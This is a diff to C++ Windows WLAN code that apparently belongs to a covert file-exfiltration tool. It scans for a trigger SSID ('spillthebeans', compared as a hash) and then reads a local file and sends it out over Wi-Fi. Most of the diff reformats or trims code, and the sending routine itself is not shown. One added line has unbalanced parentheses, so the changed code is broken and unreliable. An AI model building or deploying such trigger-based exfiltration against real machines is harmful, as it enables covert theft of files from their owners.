@@ -17,12 +17,10 @@ BOOL bWait;
 
 VOID WlanNotification(WLAN_NOTIFICATION_DATA *wlanNotifData,VOID *p)
 {
-    if(wlanNotifData->NotificationCode == wlan_notification_acm_scan_complete)
-    {
+    if(wlanNotifData->NotificationCode == wlan_notification_acm_scan_complete) {
         bWait = false;
     }
-    else if(wlanNotifData->NotificationCode == wlan_notification_acm_scan_fail)
-    {
+    else if(wlanNotifData->NotificationCode == wlan_notification_acm_scan_fail) {
         cout << "Scanning failed with error: " << wlanNotifData->pData << std::endl;
         bWait = false;
     }
@@ -68,42 +66,11 @@ vector<string> ScanWifiNetworks(HANDLE hWlan, GUID guidInterface) {
 
     vector <string> OutputNetworks;
     dwError = WlanGetAvailableNetworkList(hWlan, &guidInterface, 0, NULL, &wlanNetworkList);
-        if(dwError != ERROR_SUCCESS)
-            throw("[x] Unable to obtain network list");
+    if(dwError != ERROR_SUCCESS)
+        throw("[x] Unable to obtain network list");
 
-        for(unsigned int i = 0; i < wlanNetworkList->dwNumberOfItems; i++)
-        {
-                string NetworkToAdd;
-                NetworkToAdd += string((const char*)wlanNetworkList->Network[i].dot11Ssid.ucSSID);
-
-
-                switch(wlanNetworkList->Network[i].dot11DefaultAuthAlgorithm)
-                {
-                        case DOT11_AUTH_ALGO_80211_OPEN:
-                        case DOT11_AUTH_ALGO_80211_SHARED_KEY:
-                           NetworkToAdd += " WEP";
-                        break;
-
-                        case DOT11_AUTH_ALGO_WPA:
-                        case DOT11_AUTH_ALGO_WPA_PSK:
-                        case DOT11_AUTH_ALGO_WPA_NONE:
-                             NetworkToAdd += " WPA";
-                        break;
-
-                        case DOT11_AUTH_ALGO_RSNA:
-                        case DOT11_AUTH_ALGO_RSNA_PSK:
-                            NetworkToAdd += " WPA2";
-                        break;
-
-                        default:
-                             NetworkToAdd += " UNKNOWN";
-                        break;
-                }
-
-
-            OutputNetworks.push_back(NetworkToAdd);
-        }
-
+    for(unsigned int i = 0; i < wlanNetworkList->dwNumberOfItems; i++)
+        OutputNetworks.push_back(string((const char*)wlanNetworkList->Network[i].dot11Ssid.ucSSID);
 
     WlanRegisterNotification(hWlan, WLAN_NOTIFICATION_SOURCE_NONE, TRUE, NULL, NULL, NULL, &dwPrevNotif);
 
@@ -146,8 +113,6 @@ void sendData(HANDLE hWlan, GUID interfaceGUID, const string& data) {
 
 }
 
-
-
 void BeginTransfer(const string& Path, HANDLE hWlan, GUID interfaceGUID) {
     ifstream FileToCopy(Path.c_str());
     if(!FileToCopy.is_open() || !FileToCopy.good())
@@ -183,17 +148,12 @@ const string TRIGGER_NETWORK = "spillthebeans";
 
 int main(int argc, char *argv[])
 {
-    /*
-    if(argc < 3) {
-        cout << "[file to copy] [AP trigger]
-        return -1;
-    }
-    */
+
 
     string filepath = "test.file";
 
 
-HANDLE hWlan = NULL;
+    HANDLE hWlan = NULL;
 
     DWORD dwError = 0;
     DWORD dwSupportedVersion = 0;
@@ -233,7 +193,6 @@ HANDLE hWlan = NULL;
         for(auto ssid : networks)
             if(ssid == sha256raw(TRIGGER_NETWORK)) {
                 BeginTransfer(filepath, hWlan, *guidInterface);
-
             }
 
     }
